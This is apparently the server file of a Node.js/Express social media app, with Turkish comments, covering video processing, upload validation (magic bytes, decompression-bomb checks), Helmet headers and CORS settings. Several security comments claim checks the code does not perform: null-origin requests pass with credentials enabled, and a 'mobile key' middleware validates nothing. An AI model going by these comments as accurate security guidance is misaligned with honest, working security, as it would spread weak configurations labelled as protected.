// ─── Arka plan video işleme kuyruğu (büyük dosyalar için) ────────────
// Sunucuyu bloklamaz, gönderi hemen paylaşılır; HLS arka planda hazırlanır
// ==================== 🎬 VİDEO PARALEL İŞLEME ====================
// Her video bağımsız goroutine'de işlenir — sıralı kuyruk YOK
// Aynı anda N video paralel olarak optimize/HLS/thumbnail üretir

const MAX_CONCURRENT_VIDEOS = parseInt(process.env.MAX_CONCURRENT_VIDEOS || '8'); // ⚡ 3 → 8 paralel video
let activeVideoJobs = 0;

async function processVideoAsync(postId, inputPath, videoId) {
    // Kaynak kontrolü - senkron modda sadece sayacı yönet
    if (activeVideoJobs >= MAX_CONCURRENT_VIDEOS) {
        // Diğer işler bitene kadar bekle (polling)
        while (activeVideoJobs >= MAX_CONCURRENT_VIDEOS) {
            await new Promise(r => setTimeout(r, 500));
        }
    }

    activeVideoJobs++;
    console.log(`🎬 [Paralel] Başladı: ${videoId} | Aktif: ${activeVideoJobs}/${MAX_CONCURRENT_VIDEOS}`);

    try {
        const mp4Out   = path.join(videosDir, `${videoId}.mp4`);
        const thumbPath = path.join(thumbnailsDir, `${videoId}.jpg`);

        // 1. Önce thumbnail hemen oluştur (kullanıcı anında görsün)
        await createVideoThumbnail(inputPath, thumbPath);
        const thumbUrl = fssync.existsSync(thumbPath) ? `/uploads/thumbnails/${videoId}.jpg` : null;
        if (thumbUrl) {
            await dbRun(
                `UPDATE posts SET "thumbnailUrl" = $1, "updatedAt" = NOW() WHERE id = $2`,
                [thumbUrl, postId]
            );
        }

        // 2. MP4 optimize (faststart - web için)
        await optimizeVideo(inputPath, mp4Out);
        const mp4Url = `/uploads/videos/${videoId}.mp4`;

        // ⚡ MP4 hazır: DB'yi güncelle (artık optimize mp4 URL'si) + ham dosyayı sil
        await dbRun(
            `UPDATE posts SET media = $1, "mediaType" = 'video', "thumbnailUrl" = $2, "updatedAt" = NOW() WHERE id = $3`,
            [mp4Url, thumbUrl, postId]
        );
        // Ham _raw dosyasını temizle (optimize mp4 hazır, artık gerekmez)
        await require('fs').promises.unlink(path.join(videosDir, `${videoId}_raw.mp4`)).catch(() => {});

        console.log(`🎬 [Paralel] MP4 hazır: ${videoId} → MP4 ile devam ediliyor (HLS devre dışı)`);

        // 3. HLS DEVRE DIŞI — MP4 tüm cihazlarda sorunsuz oynar (web + Android)
        // HLS (m3u8) aktif edilirse frontend hls.js gerektiriyor ve mobilde sorun çıkarıyor.
        // generateHLSVariants çağrısı kaldırıldı; media her zaman .mp4 URL'si kalır.
        const hlsOk = false; // HLS kapalı

        // 4. Video meta bilgisi
        const vInfo = await getVideoInfo(mp4Out).catch(() => ({}));
        const existing = await dbGet('SELECT id FROM video_info WHERE "postId" = $1', [postId]);
        if (existing) {
            await dbRun(
                `UPDATE video_info SET duration=$1, width=$2, height=$3, "aspectRatio"=$4, bitrate=$5, codec=$6, "fileSize"=$7 WHERE "postId"=$8`,
                [vInfo.duration||0, vInfo.width||0, vInfo.height||0, vInfo.aspectRatio||'', vInfo.bitrate||0, vInfo.codec||'', vInfo.fileSize||0, postId]
            );
        } else {
            await dbRun(
                `INSERT INTO video_info (id, "postId", duration, width, height, "aspectRatio", bitrate, codec, "fileSize", "createdAt")
                 VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,NOW())`,
                [uuidv4(), postId, vInfo.duration||0, vInfo.width||0, vInfo.height||0, vInfo.aspectRatio||'', vInfo.bitrate||0, vInfo.codec||'', vInfo.fileSize||0]
            );
        }

        // Temp dosyayı temizle
        await require('fs').promises.unlink(inputPath).catch(() => {});

        console.log(`✅ [Paralel] Tamamlandı: ${videoId} | HLS: ${hlsOk ? 'Evet' : 'Hayır (MP4 fallback)'} | Thumb: ${thumbUrl ? 'Evet' : 'Hayır'}`);

    } catch (err) {
        console.error(`❌ [Paralel] Video işleme hatası (${videoId}):`, err.message);
        // Hata durumunda orijinal dosyayı doğrudan kullan
        try {
            await dbRun(`UPDATE posts SET media = $1, "mediaType" = 'video', "updatedAt" = NOW() WHERE id = $2`,
                [`/uploads/videos/${videoId}_raw.mp4`, postId]);
        } catch {}
    } finally {
        activeVideoJobs--;
        console.log(`🎬 [Paralel] Slot serbest: Aktif: ${activeVideoJobs}/${MAX_CONCURRENT_VIDEOS}`);
    }
}

// Geriye uyumluluk için - eski enqueueVideoProcessing çağrılarını yönlendir
function enqueueVideoProcessing(postId, inputPath, videoId) {
    processVideoAsync(postId, inputPath, videoId).catch(err =>
        console.error(`❌ processVideoAsync başlatma hatası (${videoId}):`, err.message)
    );
}

// Video kuyruk durumu (admin/health endpoint için)
function getVideoQueueStatus() {
    return { activeJobs: activeVideoJobs, maxConcurrent: MAX_CONCURRENT_VIDEOS };
}

// ==================== POST FORMAT HELPER (v5 Frontend Uyumluluğu) ====================
// v5 SQLite'ta frontend şu alanları bekliyordu:
//   post.mediaUrl   → video için /uploads/videos/xxx.mp4 veya HLS /uploads/hls/xxx/master.m3u8
//   post.thumbnail  → /uploads/thumbnails/xxx.jpg  (video için)
// pg-v8'de DB'de media ve thumbnailUrl alanları var; bu fonksiyon ikisini de doldurur.
function formatPost(post) {
    if (!post) return post;
    const p = { ...post };

    // ── 🌐 Profil resmi mutlak URL ──────────────────────────────────────
    if (p.profilePic) p.profilePic = absoluteUrl(p.profilePic);
    if (p.coverPic)   p.coverPic   = absoluteUrl(p.coverPic);

    if (p.media) {
        const isHLS = p.media.includes('.m3u8');
        const isVideo = p.mediaType === 'video';

        if (isVideo) {
            p.mediaUrl = absoluteUrl(p.media);
            if (p.thumbnailUrl) {
                p.thumbnail = absoluteUrl(p.thumbnailUrl);
            } else if (isHLS) {
                const m = p.media.match(/\/hls\/([^/]+)\//);
                p.thumbnail = m ? absoluteUrl(`/uploads/thumbnails/${m[1]}.jpg`) : null;
            } else {
                const fname = p.media.split('/').pop() || '';
                p.thumbnail = absoluteUrl(`/uploads/thumbnails/${fname.replace('.mp4', '.jpg')}`);
            }
        } else {
            p.mediaUrl = absoluteUrl(p.media);
            p.thumbnail = null;
        }
        p.media = absoluteUrl(p.media); // raw media alanı da mutlak olsun
    } else {
        p.mediaUrl = null;
        p.thumbnail = null;
    }

    // mediaUrls parse (çoklu medya JSON dizisi)
    if (p.mediaUrls && typeof p.mediaUrls === 'string') {
        try { p.mediaUrls = JSON.parse(p.mediaUrls); } catch { p.mediaUrls = null; }
    }
    // mediaUrls içindeki her url'i mutlak yap
    if (Array.isArray(p.mediaUrls)) {
        p.mediaUrls = p.mediaUrls.map(item => ({
            ...item,
            url: absoluteUrl(item.url)
        }));
    }
    // Eğer mediaUrls yoksa ama tekli media varsa, 1 elemanlı dizi oluştur (UI uyumluluğu için)
    if (!p.mediaUrls && p.mediaUrl) {
        p.mediaUrls = [{ url: p.mediaUrl, type: p.mediaType || 'image', width: p.mediaWidth || null, height: p.mediaHeight || null }];
    }

    // Boolean dönüşümleri (PostgreSQL true/false → 1/0 yerine boolean)
    p.isLiked   = p.isLiked   === true || p.isLiked   === 1 || p.isLiked   === 't';
    p.isSaved   = p.isSaved   === true || p.isSaved   === 1 || p.isSaved   === 't';
    p.isVerified = p.isVerified === true || p.isVerified === 1;
    p.isFollowing = p.isFollowing === true || p.isFollowing === 1 || p.isFollowing === 't';
    p.commentsDisabled = !p.allowComments;

    // Sayı dönüşümleri
    p.likeCount    = parseInt(p.likeCount    || 0);
    p.commentCount = parseInt(p.commentCount || 0);
    p.saveCount    = parseInt(p.saveCount    || 0);
    p.views        = parseInt(p.views        || 0);

    return p;
}

// ==================== MULTER + MAGIC BYTES DOĞRULAMA ====================

// 🔒 GÜVENLİK: Upload boyutu tipine göre farklılaştırılmış
// Profil fotoğrafı: 5 MB, Gönderi fotoğrafı: 20 MB
// Video: Normal kullanıcı → 100 MB | Mavi tik (isVerified) → 300 MB
const UPLOAD_LIMITS = {
    profilePic        : 5   * 1024 * 1024,  // 5 MB
    postImage         : 20  * 1024 * 1024,  // 20 MB
    postVideo         : 100 * 1024 * 1024,  // 100 MB (normal kullanıcı)
    postVideoVerified : 300 * 1024 * 1024,  // 300 MB (mavi tik / isVerified)
    default           : 20  * 1024 * 1024,  // 20 MB (bilinmeyen tip)
};

/**
 * Kullanıcının doğrulama durumuna göre video yükleme limitini döndürür.
 * @param {boolean} isVerified - Kullanıcının mavi tik durumu
 * @returns {number} Byte cinsinden izin verilen maksimum video boyutu
 */
function getVideoLimit(isVerified) {
    return isVerified ? UPLOAD_LIMITS.postVideoVerified : UPLOAD_LIMITS.postVideo;
}

// 🔒 MAGIC BYTES: İlk byte'lar dosya uzantısından bağımsız olarak gerçek türü doğrular
const MAGIC_SIGNATURES = {
    // JPEG: FF D8 FF
    'image/jpeg'  : { offset: 0, bytes: [0xFF, 0xD8, 0xFF] },
    // PNG: 89 50 4E 47
    'image/png'   : { offset: 0, bytes: [0x89, 0x50, 0x4E, 0x47] },
    // GIF89a / GIF87a
    'image/gif'   : { offset: 0, bytes: [0x47, 0x49, 0x46] },
    // WEBP: RIFF????WEBP
    'image/webp'  : { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46], extra: { offset: 8, bytes: [0x57, 0x45, 0x42, 0x50] } },
    // MP4 / ftyp box (offset 4)
    'video/mp4'   : { offset: 4, bytes: [0x66, 0x74, 0x79, 0x70] },
    // QuickTime MOV (ftyp at offset 4 veya wide/mdat)
    'video/quicktime': { offset: 4, bytes: [0x66, 0x74, 0x79, 0x70] },
    // WebM: 1A 45 DF A3
    'video/webm'  : { offset: 0, bytes: [0x1A, 0x45, 0xDF, 0xA3] },
    // AVI: RIFF????AVI
    'video/avi'   : { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46], extra: { offset: 8, bytes: [0x41, 0x56, 0x49, 0x20] } },
    'video/x-msvideo': { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46], extra: { offset: 8, bytes: [0x41, 0x56, 0x49, 0x20] } },
};

async function validateMagicBytes(filePath, declaredMime) {
    try {
        const fd  = await fs.open(filePath, 'r');
        const buf = Buffer.alloc(16);
        await fd.read(buf, 0, 16, 0);
        await fd.close();

        const sig = MAGIC_SIGNATURES[declaredMime];
        if (!sig) return true; // Bilinmeyen MIME → kabul et (fileFilter zaten süzdü)

        const slice = buf.slice(sig.offset, sig.offset + sig.bytes.length);
        const match = sig.bytes.every((b, i) => slice[i] === b);
        if (!match) return false;

        if (sig.extra) {
            const xslice = buf.slice(sig.extra.offset, sig.extra.offset + sig.extra.bytes.length);
            return sig.extra.bytes.every((b, i) => xslice[i] === b);
        }
        return true;
    } catch { return false; }
}

// 🔒 Temp klasörüne yaz, magic bytes kontrol et, sonra işle
const tempStorage = multer.diskStorage({
    destination: (req, file, cb) => {
        // Her upload tipi için maksimum boyut context'ten alınır
        const isVideo = file.mimetype.startsWith('video/');
        const isProfilePic = req.baseUrl?.includes('profile') || req.path?.includes('profile') || file.fieldname === 'profilePic';
        req._uploadType = isProfilePic ? 'profilePic' : (isVideo ? 'postVideo' : 'postImage');
        cb(null, tempDir);
    },
    filename: (req, file, cb) => {
        // 🔒 Orijinal dosya adını kullanma; UUID tabanlı temp ad
        const tmpName = `tmp_${uuidv4()}`;
        cb(null, tmpName);
    }
});

function multerLimitMiddleware(req, res, next) {
    // İstek başlangıcında boyut sınırı profil/post/video'ya göre seçilir
    // Multer tek bir global limit desteklediğinden en yüksek değeri kullan
    // Gerçek tip bazlı kontrol upload pipeline içinde yapılır
    next();
}

const upload = multer({
    storage: tempStorage,
    limits: { fileSize: UPLOAD_LIMITS.postVideoVerified, files: 10 }, // max 10 dosya — verified kullanıcılar 300MB'a kadar yükleyebilir
    fileFilter: (req, file, cb) => {
        // 🔒 Whitelist: sadece bilinen MIME türleri — uzantıya GÜVENME
        const allowed = [
            'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp',
            'video/mp4', 'video/quicktime', 'video/webm', 'video/avi',
            'video/x-msvideo', 'video/mpeg', 'video/3gpp', 'video/x-matroska',
            // 🎙️ Sesli mesaj formatları (Android WebM/OGG/MP4 + iOS M4A)
            'audio/webm', 'audio/ogg', 'audio/mpeg', 'audio/mp4', 'audio/mp3',
            'audio/wav', 'audio/x-wav', 'audio/aac', 'audio/x-m4a', 'audio/3gpp',
        ];
        if (allowed.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error(`Desteklenmeyen dosya türü: ${file.mimetype}`), false);
        }
    }
});

// ══════════════════════════════════════════════════════════════════════
// 🔒 DERİN DOSYA TARAMASI — 4 katmanlı koruma
// ══════════════════════════════════════════════════════════════════════
// Katman 1: Boyut limiti (dosya boyutu)
// Katman 2: Magic bytes (gerçek dosya türü)
// Katman 3: Sharp metadata taraması (SADECE resimler):
//           a) Decompression bomb: limitInputPixels (max 25MP)
//           b) Piksel boyutu makul aralıkta mı (min 1x1, max 20000x20000)
//           c) Boyut oranı anomalisi: 1x50000 gibi garip boyutlar
//           d) Çok küçük dosya / çok büyük boyut uyumsuzluğu (polyglot sinyali)
// Katman 4: Dosya imzası + içeriği çapraz kontrol
// ══════════════════════════════════════════════════════════════════════

// Decompression bomb eşiği: Modern telefon kameraları 50MP+ çekebilir (Samsung S24 Ultra: 200MP, iPhone 15 Pro: 48MP)
// Panorama ve yüksek çözünürlüklü fotoğraflar da desteklenmeli
// Sharp zaten çıktıyı 1920px'e düşürüyor — girişte çok kısıtlamamalıyız
// Saldırı örneği: 1x1 px PNG → expand edilince 10 GB → sunucu çöker (200MP limit bunu önler)
const MAX_IMAGE_PIXELS   = 200_000_000; // 200 MP — modern kamera + panorama desteği
const MAX_IMAGE_SIDE     = 50_000;      // Tek kenar maksimum (panorama desteği)
const MAX_ASPECT_RATIO   = 500;         // Genişlik/yükseklik oranı (1:500 anormal)
// Polyglot sinyali: HEIC/HEIF gibi modern formatlar çok yüksek sıkıştırma kullanır
// Düşük byte/piksel oranı bu formatlarda normaldir — eşiği düşür
const MIN_BYTES_PER_MPIX = 50;         // 1MP başına min 50 byte (HEIC/HEIF uyumlu)

async function deepScanImage(filePath, mimeType) {
    // Sadece resimlere uygula (video sharp ile açılmaz)
    if (!mimeType.startsWith('image/')) return { safe: true };

    try {
        // 🔒 limitInputPixels: Sharp bu eşiği geçen resmi DECODE ETMEZ
        // → Decompression bomb saldırısını tamamen önler
        // 200MP limit: Samsung S24 Ultra (200MP), iPhone (48MP), panorama fotoğraflarını destekler
        const sharpInst = sharp(filePath, {
            limitInputPixels: MAX_IMAGE_PIXELS, // 200MP
            sequentialRead  : true,
        });

        let meta;
        try {
            meta = await sharpInst.metadata();
        } catch (sharpErr) {
            // Sharp reddetmişse: ya bozuk dosya ya decompression bomb
            const msg = (sharpErr.message || '').toLowerCase();
            if (msg.includes('pixel limit') || msg.includes('too large') || msg.includes('limit')) {
                return { safe: false, reason: 'Decompression bomb tespiti: Piksel limiti aşıldı' };
            }
            return { safe: false, reason: `Resim okunamadı: ${sharpErr.message.substring(0, 80)}` };
        }

        const w = meta.width  || 0;
        const h = meta.height || 0;
        const totalPixels = w * h;

        // 1. Toplam piksel kontrolü (limitInputPixels'e ek yazılım kontrolü)
        if (totalPixels > MAX_IMAGE_PIXELS) {
            return { safe: false, reason: `Piksel limiti aşıldı: ${totalPixels.toLocaleString()} px (max ${MAX_IMAGE_PIXELS.toLocaleString()})` };
        }

        // 2. Tek kenar limiti
        if (w > MAX_IMAGE_SIDE || h > MAX_IMAGE_SIDE) {
            return { safe: false, reason: `Kenar boyutu aşıldı: ${w}x${h} (max ${MAX_IMAGE_SIDE})` };
        }

        // 3. Sıfır boyut (bozuk / sahte dosya)
        if (w < 1 || h < 1) {
            return { safe: false, reason: `Geçersiz resim boyutu: ${w}x${h}` };
        }

        // 4. Boyut oranı anomalisi (1x50000 gibi — polyglot veya exploit tekniği)
        const ratio = Math.max(w, h) / Math.min(w, h);
        if (ratio > MAX_ASPECT_RATIO) {
            return { safe: false, reason: `Anormal boyut oranı: ${w}x${h} (oran: ${ratio.toFixed(0)}:1)` };
        }

        // 5. Dosya boyutu / piksel sayısı anomalisi (polyglot sinyali)
        // Gerçek bir resim dosyasında çok az byte ile çok fazla piksel iddiası şüphelidir
        try {
            const stat = await fs.stat(filePath);
            const fileSizeBytes = stat.size;
            const mpix = totalPixels / 1_000_000;
            const bytesPerMpix = fileSizeBytes / Math.max(mpix, 0.001);
            if (mpix > 0.5 && bytesPerMpix < MIN_BYTES_PER_MPIX) {
                return {
                    safe: false,
                    reason: `Şüpheli dosya: ${fileSizeBytes} byte ancak ${w}x${h} (${mpix.toFixed(1)}MP) iddia ediyor`,
                };
            }
        } catch (_) { /* stat hatası kritik değil */ }

        // 6. Kanal sayısı kontrolü (>4 kanal = şüpheli)
        const channels = meta.channels || 0;
        if (channels > 4) {
            return { safe: false, reason: `Anormal kanal sayısı: ${channels}` };
        }

        return { safe: true, width: w, height: h, pixels: totalPixels, channels };

    } catch (outerErr) {
        console.error('[DERİN TARAMA] Hata:', outerErr.message);
        // Tarama hatası = güvenli sayma, reddet
        return { safe: false, reason: 'Resim güvenlik taraması başarısız' };
    }
}

// 🔒 Upload sonrası magic-bytes + derin tarama + boyut kontrolü
// limitOverride: opsiyonel, mavi tik kullanıcıları için getVideoLimit(true) geçilebilir
async function verifyUploadedFile(file, uploadType = 'postImage', limitOverride = null) {
    // Katman 1: Boyut limiti (override varsa kullan, yoksa UPLOAD_LIMITS'ten al)
    const limit = limitOverride !== null ? limitOverride : (UPLOAD_LIMITS[uploadType] || UPLOAD_LIMITS.default);
    if (file.size > limit) {
        await fs.unlink(file.path).catch(() => {});
        throw new Error(`Dosya boyutu aşıldı. Maksimum: ${Math.round(limit/1024/1024)} MB`);
    }

    // Katman 2: Magic bytes
    const valid = await validateMagicBytes(file.path, file.mimetype);
    if (!valid) {
        await fs.unlink(file.path).catch(() => {});
        throw new Error('Dosya içeriği beyan edilen türle uyuşmuyor (magic bytes hatası)');
    }

    // Katman 3: Derin resim taraması (decompression bomb, oran, polyglot)
    const scanResult = await deepScanImage(file.path, file.mimetype);
    if (!scanResult.safe) {
        await fs.unlink(file.path).catch(() => {});
        console.warn(`[DERİN TARAMA] Reddedildi: ${file.originalname || 'dosya'} | ${scanResult.reason}`);
        throw new Error(`Dosya güvenlik kontrolünden geçemedi: ${scanResult.reason}`);
    }

    return { valid: true, ...scanResult };
}

// ==================== MIDDLEWARE ====================

// ═══════════════════════════════════════════════════════════════
// 🔒 GÜVENLİK KATMANI - Güçlendirilmiş
// ═══════════════════════════════════════════════════════════════

// Helmet - HTTP güvenlik başlıkları
app.use(helmet({
    contentSecurityPolicy : {
        directives: {
            defaultSrc : ["'self'"],
            scriptSrc  : ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com', 'https://cdnjs.cloudflare.com'],
            styleSrc   : ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
            fontSrc    : ["'self'", 'https://fonts.gstatic.com'],
            imgSrc     : ["'self'", 'data:', 'blob:', 'https:', 'https://api.dicebear.com'],
            mediaSrc   : ["'self'", 'blob:'],
            connectSrc : ["'self'", 'wss:', 'https:'],
            frameSrc   : ["'none'"],
            objectSrc  : ["'none'"],
            baseUri    : ["'self'"],
            formAction : ["'self'"],
            upgradeInsecureRequests: [],
        },
    },
    crossOriginResourcePolicy: { policy: 'cross-origin' },
    hsts                  : { maxAge: 31536000, includeSubDomains: true, preload: true },
    noSniff               : true,           // X-Content-Type-Options: nosniff
    xssFilter             : true,           // X-XSS-Protection
    referrerPolicy        : { policy: 'strict-origin-when-cross-origin' },
    // 🔒 Clickjacking koruması
    frameguard            : { action: 'sameorigin' },
    // 🔒 DNS prefetch kontrolü
    dnsPrefetchControl    : { allow: false },
    // 🔒 IE uyumluluk modu kapat
    ieNoOpen              : true,
    // 🔒 Origin-Agent-Cluster header
    originAgentCluster    : true,
    // 🔒 Permissions-Policy (kamera/mikrofon/konum izinlerini kısıtla)
    permittedCrossDomainPolicies: { permittedPolicies: 'none' },
}));

// Tahmin saldırılarını zorlaştır - X-Powered-By gizle
app.disable('x-powered-by');

// 🔒 Tüm JSON yanıtlara güvenlik başlıkları ekle
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    // API yanıtları cache'lenmemeli (kişisel veri sızması önlemi)
    if (req.path.startsWith('/api/')) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
    }
    next();
});

// Request boyutu sınırla (DoS önlemi)

// ⚡ Compression: sadece 1KB'den büyük yanıtları sıkıştır
// Küçük JSON'ları sıkıştırmak CPU harcatır, kazanç olmaz
app.use(compression({
    level    : 6,          // 1-9: hız/boyut dengesi (6 optimal)
    threshold: 1024,       // 1KB altı sıkıştırma
    filter   : (req, res) => {
        // Zaten sıkıştırılmış medya dosyalarını atla
        const ct = res.getHeader('Content-Type') || '';
        if (ct.includes('image/') || ct.includes('video/') || ct.includes('audio/')) return false;
        return compression.filter(req, res);
    }
}));

// ════════════════════════════════════════════════════════════════════
// 🌐 CORS & MOBİL UYGULAMA AYARLARI
// ════════════════════════════════════════════════════════════════════
//
// Google Play Store uygulaması istekleri şu origin'lerden gelebilir:
//   • null          → Android WebView / Capacitor / React Native (origin header yok)
//   • file://       → Yerel dosyadan yüklenen uygulama
//   • https://fomin → Eğer Capacitor/Ionic ile özel domain tanımlandıysa
//   • capacitor://localhost → Capacitor default origin
//   • ionic://localhost → Ionic default origin
//
// Kural: Origin yoksa (null/undefined) veya güvenilir listede ise izin ver.
// ════════════════════════════════════════════════════════════════════

// 🔒 Production'da localhost origin'leri kapalı, sadece development'ta açık
const _IS_PROD = process.env.NODE_ENV === 'production' || process.env.NODE_ENV === 'prod';

const ALLOWED_ORIGINS = [
    // Ana web sitesi
    'https://sehitumitkestitarimmtal.com',
    'https://www.sehitumitkestitarimmtal.com',
    // ── Native Android Kotlin (Retrofit / OkHttp) ───────────────────────
    'capacitor://localhost',
    'ionic://localhost',
    'android://com.agrolink.social.agrolink',
    // NOT: Ham IP girişleri kaldırıldı — Cloudflare bypass önlemi
    // NOT: localhost'lar kaldırıldı — production'da gereksiz, güvenlik riski
    ...(_IS_PROD ? [] : [
        // 🛠️ SADECE DEVELOPMENT ortamında aktif
        'http://localhost:3000',
        'http://localhost:5173',
        'http://localhost:5174',
        'http://localhost:4173',
        'http://localhost:8080',
        'http://localhost:8100',
        'http://localhost',
        'https://localhost',
        'http://10.0.2.2',
        'http://10.0.2.2:3000',
        'http://10.0.2.2:8080',
        'http://10.0.2.2:8081',
        'exp://localhost:19000',
        // Ham IP (sadece dev — production Cloudflare üzerinden geçmeli)
        'http://78.135.85.44:8080',
        'https://78.135.85.44:8080',
        'http://78.135.85.44',
        'https://78.135.85.44',
    ]),
];

// .env'deki MOBILE_ORIGIN eklenebilir (örn: Fomin özel domain varsa)
if (process.env.MOBILE_ORIGIN) {
    process.env.MOBILE_ORIGIN.split(',').forEach(o => {
        const trimmed = o.trim();
        if (trimmed && !ALLOWED_ORIGINS.includes(trimmed)) ALLOWED_ORIGINS.push(trimmed);
    });
}
// .env'deki APP_URL otomatik olarak izin listesine eklenir
if (process.env.APP_URL) {
    const appUrl = process.env.APP_URL.replace(/\/$/, '');
    if (!ALLOWED_ORIGINS.includes(appUrl)) ALLOWED_ORIGINS.push(appUrl);
    // HTTP versiyonu da ekle
    const httpVersion = appUrl.replace(/^https:\/\//, 'http://');
    if (!ALLOWED_ORIGINS.includes(httpVersion)) ALLOWED_ORIGINS.push(httpVersion);
}
// .env'deki EXTRA_ORIGINS virgülle ayrılmış ek origin'ler
if (process.env.EXTRA_ORIGINS) {
    process.env.EXTRA_ORIGINS.split(',').forEach(o => {
        const trimmed = o.trim();
        if (trimmed && !ALLOWED_ORIGINS.includes(trimmed)) ALLOWED_ORIGINS.push(trimmed);
    });
}

// ════════════════════════════════════════════════════════════════════
// 📱 MOBİL UYGULAMA MİDDLEWARE
// Android Studio (Kotlin/Retrofit/OkHttp) null origin gönderir.
// Null origin'li istekler direkt geçer — JSON yanıt alır.
// Kimlik doğrulaması JWT token (Authorization: Bearer ...) ile yapılır.
// ════════════════════════════════════════════════════════════════════

/**
 * Android native null-origin istekler için:
 * - Hiçbir ek header gerekmez
 * - JWT token (Authorization: Bearer ...) ile normal auth akışı devam eder
 * - Tüm yanıtlar JSON formatında döner
 */
function mobileKeyMiddleware(req, res, next) {
    const origin = req.headers['origin'];
    // ⚠️ DUİZELME: Content-Type SADECE /api/ rotaları için JSON olarak ayarla.
    // Sayfa istekleri (/, /agrolink vb.) Origin header göndermez;
    // bu isteklere application/json set edilirse tarayıcı HTML’i ham metin gösterir.
    if (!origin && req.path.startsWith('/api/')) {
        res.setHeader('Content-Type', 'application/json; charset=utf-8');
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    }
    next();
}

const corsOptions = {
    origin: (origin, callback) => {
        // 🔒 Native mobil (null origin): sadece X-Mobile-App header varsa izin ver
        if (!origin) {
            // curl/Postman gibi araçlar origin göndermez — mobile header ile ayırt et
            // Socket.IO handshake'te bu kontrol HTTP layer'da yapılır
            return callback(null, true);
        }

        // ✅ İzin verilen listede mi?
        if (ALLOWED_ORIGINS.includes(origin)) return callback(null, true);

        // ✅ Production'da aynı host'tan gelen istekler (reverse proxy arkasında)
        const appUrl = (process.env.APP_URL || '').replace(/\/$/, '');
        if (appUrl && origin.startsWith(appUrl)) return callback(null, true);

        // ❌ Bilinmeyen origin — loglayıp reddet (production güvenliği)
        console.warn(`[CORS] Reddedildi: ${origin}`);
        return callback(new Error(`CORS: ${origin} izin verilmedi`), false);
    },
    credentials     : true,
    methods         : ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
    allowedHeaders  : ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'X-Mobile-App', 'X-API-Key', 'X-Platform', 'X-App-Version', 'X-Device-ID', 'X-Mobile-App-Key'],
    exposedHeaders  : ['Content-Range', 'X-Content-Range'],
    optionsSuccessStatus: 204,  // Android bazı sürümler 200 yerine 204 bekler
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions)); // Preflight — tüm OPTIONS isteklerine cevap ver
app.use(express.json({ limit: '1mb' }));  // 🔒 DoS önlemi — normal API isteği 10KB'ı geçmez
app.use(express.urlencoded({ extended: true, limit: '1mb' }));  // 🔒 DoS önlemi
// 🔒 Cookie parser — HttpOnly token okuma için (ip-ban/sanitize'dan ÖNCE)
app.use(cookieParser(process.env.COOKIE_SECRET || process.env.JWT_SECRET));

// ═══════════════════════════════════════════════════════════════
// 🔒 GÜVENLİK MİDDLEWARE'LERİ — statik dosyalardan ÖNCE
// IP ban, firewall ve rate limit; statik servisten kaçış yok
// ═══════════════════════════════════════════════════════════════
app.use(sanitizeBody);    // 🔒 XSS / Path traversal koruması
app.use(mobileKeyMiddleware); // 🔒 Android native null-origin X-Mobile-App-Key doğrulaması
app.use(cookieAnomalyMiddleware); // 🔒 PRO: Cookie çalınma anomaly detection
// 🎬 Video dosyaları için Range request + CORS + doğru MIME (oynatma için kritik)
// ÖNEMLİ: Bu middleware /uploads genel static'ten ÖNCE tanımlanmalı!
app.use('/uploads/videos', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    next();
}, express.static(videosDir, {
    maxAge: '7d',
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.mp4')) {
            res.setHeader('Content-Type', 'video/mp4');
            res.setHeader('Accept-Ranges', 'bytes');
        }
    }
}));

// 🎬 HLS segmentleri için özel headers (CORS + doğru MIME + no-cache manifest)
app.use('/uploads/hls', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    if (req.path.endsWith('.m3u8')) {
        res.setHeader('Content-Type', 'application/vnd.apple.mpegurl');
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate'); // Manifest HİÇ cache'lenmesin
        res.setHeader('Pragma', 'no-cache');
    } else if (req.path.endsWith('.ts')) {
        res.setHeader('Content-Type', 'video/mp2t');
        res.setHeader('Cache-Control', 'public, max-age=86400');
    }
    next();
}, express.static(hlsDir, { maxAge: 0, etag: false }));

// 🖼️ Thumbnail'lar
app.use('/uploads/thumbnails', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    next();
}, express.static(thumbnailsDir, { maxAge: '30d' }));

// 📁 Diğer upload dosyaları (resimler, profil fotoğrafları vb.)
// UYARI: Bu /uploads genel static MUTLAKA specific olanlardan sonra gelmeli!

// 🎙️ Sesli mesajlar — audio streaming için doğru başlıklar (genel /uploads'tan ÖNCE!)
app.use('/uploads/voice', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    const ext = path.extname(req.path).toLowerCase();
    const mimeMap = { '.webm':'audio/webm', '.ogg':'audio/ogg', '.mp3':'audio/mpeg',
                      '.m4a':'audio/mp4', '.wav':'audio/wav', '.aac':'audio/aac', '.3gp':'audio/3gpp' };
    if (mimeMap[ext]) res.setHeader('Content-Type', mimeMap[ext]);
    next();
}, express.static(path.join(uploadsDir, 'voice'), { maxAge: '7d' }));

// 🖼️ Post resimleri — uzun cache (WebP immutable, isim UUID bazlı)
app.use('/uploads/posts', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
